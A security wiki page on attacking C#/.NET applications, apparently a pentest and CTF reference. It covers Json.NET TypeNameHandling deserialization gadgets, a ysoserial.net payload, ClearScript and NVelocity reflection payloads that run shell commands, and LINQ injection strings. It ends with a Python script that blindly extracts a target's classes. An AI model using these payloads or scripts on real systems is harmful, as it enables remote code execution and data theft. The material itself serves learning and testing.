---
description: C Sharp and the .NET Framework
---

# C\#

## Hello World

The first step is creating a new project. With the `console` template for a simple CLI app, you can easily fill an empty directory with the necessary files:

{% code title="Create new project" %}
```bash
mkdir HelloWorld && cd HelloWorld
dotnet new console
```
{% endcode %}

You can find external packages in the [NuGet Gallery](https://www.nuget.org/), and then add them to your project:

```bash
dotnet add package Newtonsoft.Json
```

Finally, run the main `Program.cs` file:

```bash
dotnet run
```

## Deserialization

There are different ways to serialize objects in C#, which is the process of turning it into a string. Then, this string can be passed around through other channels and eventually be **deserialized** to receive an identical copy of the original object.

Creating arbitrary objects with fields is dangerous when this deserialized string is in the attacker's control. By abusing lax configuration, you can instantiate objects with special behavior to read/write files, or even achieve Remote Code Execution if the right gadgets are accessible.

### Newtonsoft Json.NET

The most common form on deserialization in the web is JSON. The [Json.NET](https://www.newtonsoft.com/json) library is the most widely-used for turning some string from the user into an instance of a class. The fields on this class define the structure of the JSON, for example ([source](https://www.newtonsoft.com/json/help/html/DeserializeObject.htm)):

<pre class="language-csharp"><code class="lang-csharp">public class Account {
<strong>    public string Email { get; set; }
</strong><strong>    public bool Active { get; set; }
</strong><strong>    public DateTime CreatedDate { get; set; }
</strong><strong>    public IList&#x3C;string> Roles { get; set; }
</strong>}

string json = @"{
  'Email': 'james@example.com',
  'Active': true,
  'CreatedDate': '2013-01-20T00:00:00Z',
  'Roles': [
    'User',
    'Admin'
  ]
}";

<strong>Account account = JsonConvert.DeserializeObject&#x3C;Account>(json);
</strong>Console.WriteLine(account.Email);  // "james@example.com"
</code></pre>

The above example is **secure**, because it only allows deserializing basic data types. It can be wrongly configured, however, to allow all classes instead, which may include dangerous ones we call "gadgets". This is possible if a `JsonSerializerSettings` is given as the 2nd argument with a `.TypeNameHandling` value other than `None`.

<pre class="language-csharp" data-title="Vulnerable Example"><code class="lang-csharp">JsonConvert.DeserializeObject&#x3C;Account>(json, new JsonSerializerSettings {
<strong>    TypeNameHandling = TypeNameHandling.All
</strong><strong>    // Also `.Arrays`, `.Objects` and `.Auto` are vulnerable
</strong>});
</code></pre>

This enables a special `$type` key for each JSON object (also in nested properties) that can reference any loaded class, and set its fields. This is only possible for properties with the `Object` type because all gadgets will inherit from it:

<pre class="language-csharp"><code class="lang-csharp">public class Vulnerable {
    public string Str { get; set; }
<strong>    public Object Obj { get; set; }
</strong>}
</code></pre>

You can easily generate a payload by _serializing_ it first with the same library and classes, then send it to the target. Make sure to include `TypeNameHandling.All` to ensure any types are included and the target can resolve them. You should **structure your classes exactly the same** as the target because the `$type` key includes this information:

<pre class="language-csharp" data-title="Generate Exploit"><code class="lang-csharp">using Newtonsoft.Json;

public class Gadget {
    private string _input;
    public string Input {
        get { return _input; }

<strong>        set {
</strong><strong>            _input = value;
</strong><strong>            // Imagine some dangerous logic here...
</strong><strong>            Console.WriteLine("Command executed: " + value);
</strong><strong>        }
</strong>    }
}

public class Vulnerable {
    public required string Str { get; set; }
    // Dangerous: this allows the `object` type
<strong>    public required object Obj { get; set; }
</strong>}

class Program {
    static void Main() {
        // Serialization
<strong>        Gadget gadget = new Gadget { Input = "calc.exe" };
</strong>        Vulnerable vuln = new Vulnerable {
            Str = "Hello, world!",
            Obj = gadget
        };
<strong>        string json = JsonConvert.SerializeObject(vuln, new JsonSerializerSettings         {
</strong>            TypeNameHandling = TypeNameHandling.All
        });
        Console.WriteLine(json);  // {"$type":"Vulnerable, JsonTest","Str":"test@example.com","Obj":{"$type":"Gadget, JsonTest","Input":"calc.exe"}}

        Console.WriteLine("-> Press enter to continue..."); Console.ReadLine();

        // Deserialization
<strong>        Vulnerable? account = JsonConvert.DeserializeObject&#x3C;Vulnerable>(json, new JsonSerializerSettings {
</strong>            TypeNameHandling = TypeNameHandling.All
        });
        if (account is not null) Console.WriteLine("Result: " + account.Obj);
        else Console.WriteLine("Failed to deserialize");
    }
}
</code></pre>

When ran with `dotnet run`, this will generate the object with payload first, and then serialize it into JSON ready to send to the target. The 2nd part will similar the target receiving the string, and deserializing it into a vulnerable type. You will see that the `set {}` method is called twice:

<pre class="language-json" data-title="Output" data-overflow="wrap"><code class="lang-json">Command executed: calc.exe
<strong>{"$type":"Vulnerable, JsonTest","Str":"test@example.com","Obj":{"$type":"Gadget, JsonTest","Input":"calc.exe"}}
</strong>-> Press enter to continue...

<strong>Command executed: calc.exe
</strong>Result: Gadget
</code></pre>

The syntax is pretty simple, so if you want to, you can even handcraft these payloads. The syntax for the `$type` key is `Path.To.Class, AssemblyName`, where the path to the class is follows the nested structure of namespaces and classes to your gadget.

For another example, see the writeup below:

{% embed url="https://jorianwoltjer.com/blog/p/ctf/htb-university-ctf-2023/nexus-void#json-deserialization" %}
Writeup including a custom Json.NET deserialization chain to execute commands
{% endembed %}

Json.NET is far from the only library allowing arbitrary objects to be deserialized. To get an overflow, see the table below to understand which library supports what features:

<figure><img src="../.gitbook/assets/image (58).png" alt=""><figcaption><p>Table of serializers and what gadgets you can execute with them (<a href="https://speakerdeck.com/pwntester/attacking-net-serialization?slide=15">source</a>)</p></figcaption></figure>

### Gadget Chains

You'll be very lucky if you have the source code of your target application, and find a single setter in there that allows RCE. Instead, you should rely on chains of gadgets, often in widely-used libraries.

One small gadget can maybe call a function on another gadget, which grabs a property from a third gadget to ultimately use it in an unsafe way. It's an art to combine these in creative ways, and requires a good understanding of what's available and possible in the codebase. The `ysoserial.net` tool collects such gadgets and can generate them with payloads at will:

{% embed url="https://github.com/pwntester/ysoserial.net" %}
Collection of gadget chains and generator for serialized input
{% endembed %}

To use it, select a gadget chain with `-g`, select the Formatter with `-f` (eg. `Json.Net`). Most gadgets will achieve RCE, and with the `-c` argument you can customize the final shell command it executes.

<pre class="language-shell-session"><code class="lang-shell-session"><strong>$ ysoserial.net -g ObjectDataProvider -f Json.Net -c 'calc.exe' | tr "'" '"'
</strong>{
    "$type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35",
    "MethodName":"Start",
    "MethodParameters":{
        "$type":"System.Collections.ArrayList, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089",
        "$values":["cmd", "/c calc.exe"]
    },
    "ObjectInstance":{"$type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"}
}
</code></pre>

If the target loads the `PresentationFramework` assembly and you cause it to insecurely deserialize the above payload, the `calc.exe` command will be executed. If the conditions on the target are unknown, you should try many different known chains until one works.

### Finding Gadgets

To find your own gadgets, you should look for code that you are able to trigger during deserialization. These are `get {}` and `set {}` methods as mentioned above, but the **constructor will also be called**. You can pass named arguments to the constructor by your key names, for example:

<pre class="language-csharp"><code class="lang-csharp">public class Gadget {
<strong>    public Gadget(string input, int input2) {
</strong><strong>        Console.WriteLine("Gadget(" + input + ", " + input2 + ")");
</strong><strong>    }
</strong>}
</code></pre>

{% code title="Payload" %}
```json
{"$type":"Gadget, JsonTest","input":"calc.exe", "input2": 1337}
```
{% endcode %}

{% code title="Output" %}
```csharp
Gadget(calc.exe, 1337)
```
{% endcode %}

Some gadgets will call methods on your arguments, such as the `HashMap` calling `.hashCode()` to turn it into a unique integer. This means any vulnerable logic inside an object's `hashCode` implementation will also be callable if we just wrap in in a hashmap! Combing gadgets in chains like this is the standard way to find exploits.

## Reflection

Like many languages, C# has ways to interact with the type system at runtime through Reflection. This is useful in exploits when you can execute some limited C# code, or an interpreter of another language while having some interoperability. In such cases, you can often access properties and call methods on objects, and using Reflection, that can lead to RCE.

This is mainly done with chaining built-in methods on various types. All methods and attributes are well-documented on the Microsoft site, for example, the [`Assembly` class](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly?view=net-9.0).

[Visual Studio](https://visualstudio.microsoft.com/) is the most featureful editor for C#. Something useful to us is when debugging any application, you can use the _Immediate Window_ to quickly evaluate some small bits of code and get correct auto-completion. This makes it easier to explore your options.

<figure><img src="../.gitbook/assets/image (71).png" alt="" width="547"><figcaption><p>Auto-complete feature and getting immediate results in Visual Studio</p></figcaption></figure>

We'll go through an example of **ClearScript**, a JavaScript interpreter that [used to have an issue](https://github.com/microsoft/ClearScript/issues/382) allowing access to Reflection (and can still be configured to do so via `AllowReflection=true`).

Your first goal should be accessing the main `Assembly`, which you can get from a [`Type`](https://learn.microsoft.com/en-us/dotnet/api/system.type?view=net-9.0#properties)  as `.Assembly`. To always get the main assembly, you can get the type of a type, which will always be the built-in type. In the example below, `Helper` was a C# object passed into the sandboxed context. We can use it to get a reference to the assembly:

```javascript
const assembly = Helper.GetType().GetType().Assembly;
```

We will now use its [`Load(String)`](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly.load?view=net-9.0#system-reflection-assembly-load\(system-string\)) method to import a built-in assembly that allows executing shell commands: [`System.Diagnostics.Process`](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.process?view=net-9.0). We can get access to [`MethodInfo`](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.methodinfo?view=net-9.0) as a variable, and to call it, we'll use [`Invoke(Object, Object[])`](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.methodbase.invoke?view=net-9.0#system-reflection-methodbase-invoke\(system-object-system-object\(\)\)) where the 2nd argument is an array representing the arguments passed to the method.

To create an array, in some cases, the simple `[]` syntax isn't possible. Using more methods, however, we can construct one out of thin air. We'll construct a new variable of type [`List<String>`](https://learn.microsoft.com/en-us/dotnet/api/system.collections.generic.list-1?view=net-9.0) which has an [`Add()`](https://learn.microsoft.com/en-us/dotnet/api/system.collections.generic.list-1.add?view=net-9.0#system-collections-generic-list-1-add\(-0\)) method. To do so, we need to pass [`Assembly.CreateInstance()`](https://learn.microsoft.com/en-us/dotnet/api/system.reflection.assembly.createinstance?view=net-9.0#system-reflection-assembly-createinstance\(system-string\)) a stringified version of the type, which we can get as follows:

{% code title="C#" %}
```csharp
var list = new List<string>();
list.GetType().ToString()  // "System.Collections.Generic.List`1[System.String]"
```
{% endcode %}

Finally, to convert this mutable `List` into a `String[]`, we'll use its [`ToArray()`](https://learn.microsoft.com/en-us/dotnet/api/system.collections.generic.list-1.toarray?view=net-9.0#system-collections-generic-list-1-toarray) method:

```javascript
const assembly = Helper.GetType().GetType().Assembly;
const load = assembly.GetType('System.Reflection.Assembly').GetMethods()[0];

const args = assembly.CreateInstance('System.Collections.Generic.List`1[System.String]');
args.Add('System.Diagnostics.Process');
const process = load.Invoke(null, args.ToArray());
```

With this new `Process` assembly, we can prepare the arguments for its [`Start(String, String)`](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.process.start?view=net-9.0#system-diagnostics-process-start\(system-string-system-string\)) method which takes the command to execute as its 1st argument, and the arguments (split by space) as shell arguments into the 2nd argument. If we list all the methods, this happens to be the 70th, and we can invoke it similar to before:

<pre class="language-javascript"><code class="lang-javascript">const args2 = assembly.CreateInstance('System.Collections.Generic.List`1[System.String]');
args2.Add('sh');
<strong>args2.Add('-c id>/tmp/pwned');
</strong>console.log(process.GetType('System.Diagnostics.Process').GetMethods()[70].Invoke(null, args2.ToArray()));
</code></pre>

This should save the output of `id` into `/tmp/pwned`.

Similarly, the [**NVelocity**](https://github.com/castleproject/NVelocity/blob/master/docs/nvelocity.md) templating framework can call arbitrary methods on C# objects, and thus is vulnerable to this Reflection abuse to reach RCE:

<pre class="language-velocity" data-title="Exploit 1"><code class="lang-velocity">#set( $assembly = $name.GetType().GetType().Assembly )
#set( $load = $assembly.GetType('System.Reflection.Assembly').GetMethods().Get(0) )
#set( $args = $assembly.CreateInstance("System.Collections.Generic.List`1[System.String]") )
$args.Add("System.Diagnostics.Process")
$args
#set( $process = $load.Invoke(null, $args.ToArray()) )
$process
#set( $args2 = $assembly.CreateInstance("System.Collections.Generic.List`1[System.String]") )
$args2.Add("bash")
<strong>$args2.Add("-c id>/tmp/pwned")
</strong>${process.GetType('System.Diagnostics.Process').GetMethods().Get(70).Invoke(null, $args2.ToArray())}
</code></pre>

Finally, below is another exploit for the same framework that uses some different methods create a [`ProcessStartInfo`](https://learn.microsoft.com/en-us/dotnet/api/system.diagnostics.processstartinfo?view=net-9.0) and also return its output in the template content:

<pre class="language-velocity" data-title="Exploit 2"><code class="lang-velocity">#set($a = "")
#set($activator_type = $a.GetType().Assembly.GetType("System.Activator"))
#set($create_instance = $activator_type.GetMethods().Get(8))
#set($args = ["System.Diagnostics.Process, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a", "System.Diagnostics.Process"])
#set($wrapped_process = $create_instance.Invoke(null, $args.ToArray()))
#set($process = $wrapped_process.Unwrap())

#set($args = ["System.Diagnostics.Process, Version=8.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a", "System.Diagnostics.ProcessStartInfo"])
#set($wrapped_process_start_info = $create_instance.Invoke(null, $args.ToArray()))
#set($process_start_info = $wrapped_process_start_info.Unwrap())

<strong>#set($process_start_info.FileName = "id")
</strong>#set($process_start_info.RedirectStandardOutput = true)

#set($flag = $process.Start($process_start_info))
<strong>$!flag.StandardOutput.ReadToEnd()
</strong></code></pre>

## LINQ Injection

[Language Integrated Query (LINQ)](https://learn.microsoft.com/en-us/dotnet/csharp/linq/) is a Microsoft library for C# used to query objects similar to SQL syntax. It does, however, support C# syntax with function calls embedded inside the syntax, such as:

```csharp
using System.Linq.Dynamic.Core;

var query = products.AsQueryable();
var response = query.Where($"Name.Contains(\"{showProducts.name}\")");
```

The above inserts user input from `showProducts.name` into the `Where()` call, which without sanitization allows an attacker to escape the `"` (double quote) and rewrite the query. For example:

* `X") || 1==1 || "" == ("X`: Shows all products
* `X") || 1==2 || "" == ("X`: Empty array

### Version < 1.3.0 RCE

The following Github Repository and accompanying article explain how to exploit such an injection for consistent Remote Code Execution.

{% embed url="https://github.com/Tris0n/CVE-2023-32571-POC" %}
Proof of Concept of the RCE
{% endembed %}

{% embed url="https://www.nccgroup.com/us/research-blog/dynamic-linq-injection-remote-code-execution-vulnerability-cve-2023-32571/" %}
Explanation and technical details of how it was found
{% endembed %}

### Latest version property access

[The patch](https://github.com/zzzprojects/System.Linq.Dynamic.Core/commit/3fb84e971abe5fb4d991a2db5f8ad125d075d062#diff-d74bcce2f4faee6ebab990038227298e78241010e3fd6e79fd8f9ab65cb73954L1706) **only restricts method calling to predefined types**. This means that methods on Strings, Arrays, etc. will work, but methods on custom types will not. It is still possible to run methods on custom types that are inherited from allowed classes, and it is still possible to access any properties.

`"".GetType().Module.Assembly` still works to get the _Standard Module_.

`GetType().Module.Assembly` gets the module of the object passed into the `Where()` function, often custom code.

By chaining more properties and using `ToArray()` on enumerables, it is possible to enumerate all classes, attributes, properties and methods in a module. The following script implements this using binary search and requires a `test()` function that injects in such a way that you can evaluate a condition.

<pre class="language-python" data-title="Exploit Script"><code class="lang-python">import requests
from tqdm import tqdm

HOST = "http://localhost:8000"

<strong>def test(condition):
</strong><strong>    data = {
</strong><strong>        "name": f"X\") || {condition} || \"\" == (\"X"
</strong><strong>    }
</strong><strong>    r = requests.post(HOST + "/api/products", json=data)
</strong><strong>    return len(r.json()["products"]) > 0
</strong>
assert test("1==1")
assert not test("1==2")

def binary_search(expression, lo=0, hi=127):
    """Find the value of an integer"""
    while lo &#x3C; hi:
        mid = (lo + hi + 1) // 2
        if test(f"{expression} &#x3C; {mid}"):
            hi = mid - 1
        else:
            lo = mid

    return lo

def find_string(expression):
    length = binary_search(f"{expression}.Length", hi=2**16)

    content = bytes([binary_search(f"{expression}[{i}].CompareTo('\x00')")
                     for i in tqdm(range(length), desc=expression, leave=False)])

    return content.decode()

types = "GetType().Module.Assembly.DefinedTypes"
types_len = binary_search(f"{types}.ToArray().Length")

for type_i in range(types_len):
    type = f"{types}.ToArray()[{type_i}]"
    type_name = find_string(f"{type}.Name")
    print(f"class {type_name} {{")

    properties_len = binary_search(
        f"{type}.DeclaredProperties.ToArray().Length")
    for property_i in range(properties_len):
        property = f"{type}.DeclaredProperties.ToArray()[{property_i}]"
        property_type = find_string(f'{property}.PropertyType.Name')
        property_name = find_string(f'{property}.Name')
        print(f"  {property_type} {property_name} {{ get; set; }}")

    fields_len = binary_search(f"{type}.DeclaredFields.ToArray().Length")
    for field_i in range(fields_len):
        field = f"{type}.DeclaredFields.ToArray()[{field_i}]"
        field_type = find_string(f'{field}.FieldType.Name')
        field_name = find_string(f'{field}.Name')
        print(f"  {field_type} {field_name};")

    print()

    methods_len = binary_search(f"{type}.DeclaredMethods.ToArray().Length")
    for method_i in range(methods_len):
        method = f"{type}.DeclaredMethods.ToArray()[{method_i}]"
        method_return_type = find_string(f"{method}.ReturnType.Name")
        method_name = find_string(f"{method}.Name")
        print(f"  {method_return_type} {method_name}() {{}}")

    print("}\n")
</code></pre>

Example output looks like this (note that some magic members are also added, these can be ignored):

{% code title="Output" %}
```csharp
class <>f__AnonymousType0`1 {
  <Products>j__TPar Products { get; set; }
  <Products>j__TPar <Products>i__Field;

  <Products>j__TPar get_Products() {}
  Boolean Equals() {}
  Int32 GetHashCode() {}
  String ToString() {}
}

class ProductsController {
  String secret;

  String testfunc() {}
  IActionResult Show() {}
}

class Product {
  String Name { get; set; }
  String <Name>k__BackingField;

  String get_Name() {}
  Void set_Name() {}
}

class Program {

  Void <Main>$() {}
}

class ShowProducts {
  String name { get; set; }
  String <name>k__BackingField;

  String get_name() {}
  Void set_name() {}
}
```
{% endcode %}

### Filter Bypasses

1. Any method call like `.GetType()` can be obfuscated as `.@GetType()`
2. Whitespace also works, eg. `.   GetType()`
